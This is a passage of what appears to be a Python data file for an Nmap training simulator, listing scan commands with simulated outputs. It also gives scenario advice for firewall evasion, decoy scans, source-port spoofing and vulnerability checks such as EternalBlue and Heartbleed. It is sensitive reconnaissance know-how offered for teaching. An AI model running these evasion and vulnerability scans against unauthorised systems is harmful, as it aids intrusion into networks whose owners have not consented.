Nmap scan report for 192.168.1.1
Host is up (0.0039s latency).
PORT     STATE         SERVICE
53/udp   open          domain
67/udp   open          dhcps
68/udp   open|filtered dhcpc
123/udp  open          ntp
161/udp  closed        snmp

Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds""",
        "scenario": "Fast UDP discovery"
    },
    # ---------- STEALTH SCANS ----------
    {
        "command": "nmap -sX 192.168.1.1",
        "description": "XMAS scan (FIN+PSH+URG flags)",
        "category": "Stealth Scans",
        "color": "#e74c3c",
        "explanation": "Sets FIN, PSH, URG simultaneously. Closed ports reply RST; open ports ignore. Bypasses simple firewalls.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0028s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
443/tcp  open|filtered https
3306/tcp open|filtered mysql

Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds""",
        "scenario": "Firewall evasion — many firewalls drop XMAS packets"
    },
    {
        "command": "nmap -sN 192.168.1.1",
        "description": "NULL scan (no flags set)",
        "category": "Stealth Scans",
        "color": "#9b59b6",
        "explanation": "Sends packets with no TCP flags. Closed ports reply RST; open ports ignore. Relies on RFC 793 behavior.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0030s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
443/tcp  open|filtered https
3306/tcp open|filtered mysql

Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds""",
        "scenario": "Similar to XMAS — pure evasion technique"
    },
    {
        "command": "nmap -sF 192.168.1.1",
        "description": "FIN scan (only FIN flag set)",
        "category": "Stealth Scans",
        "color": "#c0392b",
        "explanation": "Sets only the FIN flag. Same behavior as NULL/XMAS but uses a single flag.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0026s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
443/tcp  open|filtered https

Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds""",
        "scenario": "Classic stealth scan (obsolete on modern systems)"
    },
    {
        "command": "nmap -sA 192.168.1.1",
        "description": "ACK scan (maps firewall rules)",
        "category": "Stealth Scans",
        "color": "#c0392b",
        "explanation": "Sends ACK packets. Cannot determine open/closed — only FILTERED vs UNFILTERED. Used to map firewall rules.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0025s latency).
Not shown: 990 unfiltered tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   filtered ssh
23/tcp   filtered telnet
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds""",
        "scenario": "Firewall rule mapping — no open ports revealed"
    },
    # ---------- PORT RANGES ----------
    {
        "command": "nmap -p 1-65535 192.168.1.1",
        "description": "Scan ALL 65535 ports (very slow)",
        "category": "Port Ranges",
        "color": "#16a085",
        "explanation": "Full port sweep. Takes 10-30+ minutes per host. Use only when you need complete coverage.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
3306/tcp  open  mysql
8080/tcp  open  http-proxy
27017/tcp open  mongod

Nmap done: 1 IP address (1 host up) scanned in 892.34 seconds""",
        "scenario": "Thorough audit — finds services on non-standard ports"
    },
    {
        "command": "nmap -p 80,443,8080 192.168.1.1",
        "description": "Scan specific ports only",
        "category": "Port Ranges",
        "color": "#3498db",
        "explanation": "Targeted scan of only the ports you care about. Very fast.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
PORT     STATE  SERVICE
80/tcp   open   http
443/tcp  open   https
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds""",
        "scenario": "Verify specific services are running"
    },
    {
        "command": "nmap -p- 192.168.1.1",
        "description": "Shortcut for -p 1-65535",
        "category": "Port Ranges",
        "color": "#16a085",
        "explanation": "Same as -p 1-65535. The dash shorthand means 'all ports'.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0019s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
3306/tcp  open  mysql
8080/tcp  open  http-proxy
27017/tcp open  mongod

Nmap done: 1 IP address (1 host up) scanned in 885.12 seconds""",
        "scenario": "Full port sweep — remember, slow!"
    },
    {
        "command": "nmap -p 1-1000 192.168.1.1",
        "description": "Scan ports 1 to 1000 (common range)",
        "category": "Port Ranges",
        "color": "#3498db",
        "explanation": "Covers all well-known ports (0-1023) plus a bit more.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 5.23 seconds""",
        "scenario": "Balance between speed and coverage"
    },
    # ---------- SPEED / TIMING ----------
    {
        "command": "nmap -F 192.168.1.1",
        "description": "Fast scan — top 100 ports only",
        "category": "Speed",
        "color": "#f39c12",
        "explanation": "Scans only the 100 most common ports. Very fast but may miss services on unusual ports.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 95 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds""",
        "scenario": "Quick reconnaissance"
    },
    {
        "command": "nmap -T0 192.168.1.1",
        "description": "Paranoid timing — one probe every 5 minutes",
        "category": "Timing",
        "color": "#9b59b6",
        "explanation": "T0 (Paranoid): Extremely slow. IDS evasion. Takes hours to scan a single host.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 18734.21 seconds  [5.2 hours]""",
        "scenario": "Maximum IDS evasion — used in red team ops"
    },
    {
        "command": "nmap -T1 192.168.1.1",
        "description": "Sneaky timing — evasion, slow",
        "category": "Timing",
        "color": "#8e44ad",
        "explanation": "T1 (Sneaky): Slow scan. Each probe takes seconds. Good for avoiding detection.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http

Nmap done: 1 IP address (1 host up) scanned in 4523.12 seconds  [75 minutes]""",
        "scenario": "IDS evasion — slower than T0 but still effective"
    },
    {
        "command": "nmap -T2 192.168.1.1",
        "description": "Polite timing — less bandwidth, slower",
        "category": "Timing",
        "color": "#3498db",
        "explanation": "T2 (Polite): Reduces scan speed to use less bandwidth. Kind to the target.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 45.12 seconds""",
        "scenario": "Shared networks — don't hog bandwidth"
    },
    {
        "command": "nmap -T3 192.168.1.1",
        "description": "Normal timing (default)",
        "category": "Timing",
        "color": "#27ae60",
        "explanation": "T3 (Normal): Nmap's default timing. Balanced speed and reliability.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds""",
        "scenario": "Default — no -T flag needed"
    },
    {
        "command": "nmap -T4 192.168.1.1",
        "description": "Aggressive timing (recommended for LAN)",
        "category": "Timing",
        "color": "#e67e22",
        "explanation": "T4 (Aggressive): Fast scans. Recommended if you have a fast, reliable network. Most common choice.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0019s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds""",
        "scenario": "LAN scanning — most popular choice"
    },
    {
        "command": "nmap -T5 192.168.1.1",
        "description": "Insane timing — fastest, may miss ports",
        "category": "Timing",
        "color": "#e74c3c",
        "explanation": "T5 (Insane): Assumes extremely fast network. May miss open ports due to timeouts. Only use on localhost/LAN.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0012s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
Note: Some ports may have been missed due to T5 timing""",
        "scenario": "CTF / lab only — unreliable over internet"
    },
    # ---------- DETECTION ----------
    {
        "command": "nmap -sV 192.168.1.1",
        "description": "Version detection — identify service versions",
        "category": "Detection",
        "color": "#e74c3c",
        "explanation": "Probes open ports to determine exact service and version. Takes longer but reveals exploitable versions.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
443/tcp  open  ssl/https   nginx 1.18.0
3306/tcp open  mysql       MySQL 8.0.32
8080/tcp open  http-proxy  Squid 4.10

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 23.45 seconds""",
        "scenario": "CVE lookup — find vulnerable versions"
    },
    {
        "command": "nmap -O 192.168.1.1",
        "description": "OS detection — identify target's operating system",
        "category": "Detection",
        "color": "#e74c3c",
        "explanation": "Analyzes TCP/IP stack fingerprints to guess the operating system. Requires root.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
MAC Address: 00:1A:2B:3C:4D:5E (Cisco Systems)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.4 - 5.15
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds""",
        "scenario": "Pre-attack recon — match exploits to OS"
    },
    {
        "command": "nmap -A 192.168.1.1",
        "description": "Aggressive scan — OS + version + scripts + traceroute",
        "category": "Detection",
        "color": "#c0392b",
        "explanation": "Enables OS detection, version detection, script scanning, and traceroute. Noisiest option but most informative.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
| ssh-hostkey:
|   3072 ab:cd:ef:12:34:56:78:90:ab:cd:ef:12:34:56:78:90 (RSA)
|_  256 12:34:56:78:90:ab:cd:ef:12:34:56:78:90:ab:cd:ef (ECDSA)
80/tcp   open  http        Apache httpd 2.4.41
|_http-title: Apache2 Ubuntu Default Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp  open  ssl/https   nginx 1.18.0
| ssl-cert: Subject: commonName=example.com
| Not valid before: 2024-01-01T00:00:00
|_Not valid after:  2025-01-01T00:00:00
3306/tcp open  mysql       MySQL 8.0.32
MAC Address: 00:1A:2B:3C:4D:5E (Cisco Systems)
Device type: general purpose
Running: Linux 5.X
OS details: Linux 5.4 - 5.15
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms 192.168.1.1

Nmap done: 1 IP address (1 host up) scanned in 45.67 seconds""",
        "scenario": "One-shot comprehensive scan"
    },
    # ---------- DISCOVERY ----------
    {
        "command": "nmap -sn 192.168.1.0/24",
        "description": "Ping scan — discover live hosts (no port scan)",
        "category": "Discovery",
        "color": "#27ae60",
        "explanation": "Finds live hosts on a network without scanning ports. Uses ARP, ICMP, or TCP ping.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0012s latency).
Nmap scan report for 192.168.1.5
Host is up (0.0034s latency).
Nmap scan report for 192.168.1.12
Host is up (0.0045s latency).
Nmap scan report for 192.168.1.15
Host is up (0.0028s latency).
Nmap scan report for 192.168.1.20
Host is up (0.0031s latency).
Nmap scan report for 192.168.1.100
Host is up (0.0020s latency).
Nmap done: 256 IP addresses (6 hosts up) scanned in 3.45 seconds""",
        "scenario": "Network inventory — who's alive?"
    },
    {
        "command": "nmap -Pn 192.168.1.1",
        "description": "Skip host discovery — scan even if ping is blocked",
        "category": "Discovery",
        "color": "#16a085",
        "explanation": "Treats all hosts as online. Useful when firewalls block ICMP ping.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up.
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
443/tcp  open     https
3306/tcp filtered mysql

Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds""",
        "scenario": "Target blocks ICMP — force scan anyway"
    },
    # ---------- SCRIPTS ----------
    {
        "command": "nmap -sC 192.168.1.1",
        "description": "Run default NSE scripts against target",
        "category": "Scripts",
        "color": "#9b59b6",
        "explanation": "Equivalent to --script=default. Runs safe NSE scripts to gather more info about services.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   3072 ab:cd:ef:12:34:56:78:90:ab:cd:ef:12:34:56:78:90 (RSA)
80/tcp   open  http
|_http-title: Apache2 Ubuntu Default Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp  open  https
| ssl-cert: Subject: commonName=example.com
|_ssl-date: TLS randomness does not represent time

Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds""",
        "scenario": "Default info gathering"
    },
    {
        "command": "nmap --script vuln 192.168.1.1",
        "description": "Run vulnerability detection scripts",
        "category": "Scripts",
        "color": "#c0392b",
        "explanation": "Runs NSE vulnerability scripts against target. May cause crashes — use only on authorized targets!",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
PORT     STATE SERVICE
80/tcp   open  http
| http-csrf:
|   CSRF vulnerability detected on /admin.php
|_  Forms without tokens found: 2
| http-vuln-cve2017-5638:
|   VULNERABLE: Apache Struts Remote Code Execution
|     State: VULNERABLE
|     Risk factor: HIGH
|_    CVE: CVE-2017-5638
443/tcp  open  https
| ssl-heartbleed:
|   VULNERABLE: The Heartbleed Bug (CVE-2014-0160)
|     State: VULNERABLE
|_    Risk factor: HIGH

Nmap done: 1 IP address (1 host up) scanned in 32.67 seconds""",
        "scenario": "Ethical hacking — find CVEs on authorized targets"
    },
    {
        "command": "nmap --script=http-enum 192.168.1.1",
        "description": "Enumerate web directories and files",
        "category": "Scripts",
        "color": "#3498db",
        "explanation": "Runs http-enum script to discover common web paths (admin, login, backup).",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /admin/: Admin login page
|   /backup/: Backup directory listing
|   /phpmyadmin/: phpMyAdmin web interface
|   /robots.txt: Robots file
|_  /server-status: Apache server status

Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds""",
        "scenario": "Web app reconnaissance"
    },
    {
        "command": "nmap --script smb-vuln-ms17-010 192.168.1.1",
        "description": "Check for EternalBlue (WannaCry) vulnerability",
        "category": "Scripts",
        "color": "#e74c3c",
        "explanation": "Detects the infamous MS17-010 SMB vulnerability exploited by WannaCry ransomware.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0034s latency).
PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2008 R2 microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|_    Disclosure date: 2017-03-14

Nmap done: 1 IP address (1 host up) scanned in 4.56 seconds""",
        "scenario": "Legacy Windows vulnerability check"
    },
    {
        "command": "nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com 192.168.1.1",
        "description": "Attempt DNS zone transfer (AXFR)",
        "category": "Scripts",
        "color": "#f39c12",
        "explanation": "Tries to dump an entire DNS zone from a misconfigured name server.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
PORT   STATE SERVICE
53/tcp open  domain
| dns-zone-transfer:
| example.com.       SOA    ns1.example.com. admin.example.com.
| example.com.       NS     ns1.example.com.
| example.com.       NS     ns2.example.com.
| example.com.       A      93.184.216.34
| www.example.com.   A      93.184.216.34
| mail.example.com.  A      93.184.216.35
|_api.example.com.   A      93.184.216.36

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds""",
        "scenario": "DNS misconfiguration discovery"
    },
    # ---------- OUTPUT ----------
    {
        "command": "nmap -oN output.txt 192.168.1.1",
        "description": "Save output to text file (normal format)",
        "category": "Output",
        "color": "#34495e",
        "explanation": "Saves scan results to a text file in human-readable format.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds

[✓] Output saved to: output.txt""",
        "scenario": "Keep scan results for later review"
    },
    {
        "command": "nmap -oX output.xml 192.168.1.1",
        "description": "Save output as XML (for tools)",
        "category": "Output",
        "color": "#34495e",
        "explanation": "Saves results as XML — importable by Metasploit, Dradis, Faraday, and other tools.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds

[✓] XML output saved to: output.xml
[✓] Import in Metasploit: db_import output.xml""",
        "scenario": "Integrate with other pentesting tools"
    },
    {
        "command": "nmap -oA scan_results 192.168.1.1",
        "description": "Save output in ALL formats (.nmap, .xml, .gnmap)",
        "category": "Output",
        "color": "#2c3e50",
        "explanation": "Saves results in 3 formats simultaneously — normal, XML, and grepable.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds

[✓] Files created:
    scan_results.nmap  (normal)
    scan_results.xml   (XML)
    scan_results.gnmap (grepable)""",
        "scenario": "Best practice — save all formats"
    },
    # ---------- EVASION ----------
    {
        "command": "nmap -f 192.168.1.1",
        "description": "Fragment packets (evade simple firewalls)",
        "category": "Evasion",
        "color": "#c0392b",
        "explanation": "Splits packets into tiny fragments to bypass firewalls that don't reassemble them properly.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0034s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 4.56 seconds
Note: Fragmentation may reduce reliability""",
        "scenario": "Bypass simple ACL firewalls"
    },
    {
        "command": "nmap -D RND:10 192.168.1.1",
        "description": "Decoy scan — hide among fake IPs",
        "category": "Evasion",
        "color": "#8e44ad",
        "explanation": "Sends packets from your IP plus 10 random decoy IPs. Target sees 11 apparent attackers.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Initiating Decoy scan against 192.168.1.1
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
Decoys used: 10 random IPs + your IP""",
        "scenario": "Attribution evasion in red team"
    },
    {
        "command": "nmap --source-port 53 192.168.1.1",
        "description": "Spoof source port (bypass trust rules)",
        "category": "Evasion",
        "color": "#16a085",
        "explanation": "Sends packets from port 53 (DNS) — some firewalls trust DNS source ports implicitly.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
Note: Source port spoofed to 53 (DNS)""",
        "scenario": "Bypass naive firewall rules"
    }
]

# ==================== SCAN RESULT SCENARIOS ====================
SCAN_SCENARIOS = [
    {
        "id": "no_ports_open",
        "title": "No Open Ports",
        "icon": "🔒",
        "color": "#27ae60",
        "situation": "Firewall blocks everything, or no services running",
        "description": "Every scanned port responds with RST (closed) or no response (filtered). Target looks completely hardened.",
        "example_output": """Not shown: 1000 closed tcp ports (reset)
PORT     STATE    SERVICE
No open ports found.""",
        "meaning": "The host is either fully patched (no services) OR behind a very strict firewall. Both are common and good security posture.",
        "next_action": "Try UDP scan (-sU), different source port (--source-port 53), or fragment packets (-f) to bypass filters.",
        "packet_flow": [
            {"from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "SYN to port 80"},
            {"from": "Target", "to": "Attacker", "flag": "RST", "flag_color": "#e74c3c", "label": "RST (closed)"},
            {"from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "SYN to port 443"},
            {"from": "Target", "to": "Attacker", "flag": "RST", "flag_color": "#e74c3c", "label": "RST (closed)"}
        ]
    },
    {
        "id": "all_filtered",
        "title": "All Ports Filtered",
        "icon": "🛡️",
        "color": "#e74c3c",
        "situation": "Firewall silently drops all packets",
        "description": "Nmap sends SYN packets but receives NO response. The firewall drops everything without replying. Scan takes a long time (timeouts).",
        "example_output": """All 1000 scanned ports on 192.168.1.1 are in filtered state
(no response from host)

Nmap done: 1 IP address (1 host up) scanned in 320.45 seconds""",
        "meaning": "A firewall is actively blocking your probes. The target might still have open ports — you just can't reach them from here.",
        "next_action": "Try ACK scan (-sA) to map firewall rules, or use decoys (-D RND:10) to mask your real IP.",
        "packet_flow": [
            {"from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "SYN to port 22"},
            {"from": "Target", "to": "Attacker", "flag": "No Reply", "flag_color": "#e74c3c", "label": "Silent drop (firewall)"},
            {"from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "Retry — still no reply"},
            {"from": "Target", "to": "Attacker", "flag": "Timeout", "flag_color": "#c0392b", "label": "Filtered state"}
        ]
    },
    {
        "id": "open_ports_found",
        "title": "Open Ports Found",
        "icon": "🟢",
        "color": "#27ae60",
        "situation": "Target has exposed services",
        "description": "Firewall allows traffic through and services respond. Common on web servers, home routers, and unhardened systems.",
        "example_output": """PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1
80/tcp   open  http        Apache 2.4.41
443/tcp  open  ssl/https   nginx 1.18.0
3306/tcp open  mysql       MySQL 8.0.32""",
        "meaning": "These are your attack surface. Each open port is a potential entry point — check the service version for known CVEs.",
        "next_action": "Run version detection (-sV) and vulnerability scripts (--script vuln) to find exploitable services.",
        "packet_flow": [
            {"from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "SYN to port 80"},
            {"from": "Target", "to": "Attacker", "flag": "SYN-ACK", "flag_color": "#27ae60", "label": "OPEN!"},
            {"from": "Attacker", "to": "Target", "flag": "RST", "flag_color": "#e74c3c", "label": "Close (never completed)"},
            {"from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "SYN to port 443 (repeat)"}
        ]
    },
    {
        "id": "mixed_state",
        "title": "Mixed States",
        "icon": "🎨",
        "color": "#f39c12",
        "situation": "Some ports open, some filtered, some closed",
        "description": "The most common real-world scenario. Firewall allows web ports but blocks database and remote access ports from external networks.",
        "example_output": """PORT     STATE      SERVICE
22/tcp   filtered   ssh
80/tcp   open       http
443/tcp  open       https
3306/tcp filtered   mysql
8080/tcp closed     http-proxy""",
        "meaning": "You're seeing a partially hardened system. Web is exposed but databases and SSH are protected — typical of a well-configured DMZ setup.",
        "next_action": "Focus on the OPEN ports (80, 443). They're your attack surface. Filtered ports need evasion tricks to reach.",
        "packet_flow": [
            {"from": "Attacker", "to": "Target", "flag": "SYN→22", "flag_color": "#3498db", "label": "SSH probe"},
            {"from": "Target", "to": "Attacker", "flag": "No Reply", "flag_color": "#e74c3c", "label": "FILTERED"},
            {"from": "Attacker", "to": "Target", "flag": "SYN→80", "flag_color": "#3498db", "label": "HTTP probe"},
            {"from": "Target", "to": "Attacker", "flag": "SYN-ACK", "flag_color": "#27ae60", "label": "OPEN"}
        ]
    },
    {
        "id": "host_down",
        "title": "Host Down / Unreachable",
        "icon": "💀",
        "color": "#c0392b",
        "situation": "Target is offline or ICMP is blocked",
        "description": "Nmap reports the host as down. Either the machine is off, the network is unreachable, or ICMP ping is blocked (but ports may still be open).",
        "example_output": """Note: Host seems down. If it is really up, but blocking our ping
probes, try -Pn

Nmap done: 1 IP address (0 hosts up) scanned in 2.34 seconds""",
        "meaning": "ICMP ping was blocked OR host is offline. Try -Pn to force scanning without ping.",
        "next_action": "Retry with -Pn flag to skip host discovery and scan anyway.",
        "packet_flow": [
            {"from": "Attacker", "to": "Target", "flag": "ICMP Echo", "flag_color": "#3498db", "label": "Ping request"},
            {"from": "Target", "to": "Attacker", "flag": "No Reply", "flag_color": "#e74c3c", "label": "No ping reply"},
            {"from": "Attacker", "to": "Target", "flag": "ARP", "flag_color": "#f39c12", "label": "Try ARP probe"},
            {"from": "Target", "to": "Attacker", "flag": "No Reply", "flag_color": "#c0392b", "label": "Host unreachable"}
        ]
    },
    {
        "id": "firewall_reset",
        "title": "Firewall Reset Response",
        "icon": "⚡",
        "color": "#e67e22",
        "situation": "Firewall actively sends RST packets",
        "description": "Some firewalls (like iptables with REJECT) reply with RST instead of dropping. The scan is fast, but all ports appear 'closed'.",
        "example_output": """Not shown: 1000 closed tcp ports (reset)
PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   closed http
443/tcp  closed https""",
        "meaning": "The firewall is telling you 'no service here' with an active RST reply. This is different from 'filtered' (silent drop).",
        "next_action": "Try non-SYN scans (XMAS, NULL) — firewalls with SYN-based rules often let these through.",
        "packet_flow": [
            {"from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "SYN to port 22"},
            {"from": "Firewall", "to": "Attacker", "flag": "RST", "flag_color": "#e67e22", "label": "Firewall sends RST"},
            {"from": "Attacker", "to": "Target", "flag": "XMAS", "flag_color": "#e74c3c", "label": "Try stealth scan"},
            {"from": "Target", "to": "Attacker", "flag": "RST", "flag_color": "#c0392b", "label": "Still RST"}
        ]
    }
]

# ==================== SCAN TYPES (for port scan simulator) ====================
SCAN_TYPES = [
    {
        "id": "syn_scan",
        "name": "TCP SYN Scan",
        "nmap_flag": "-sS",
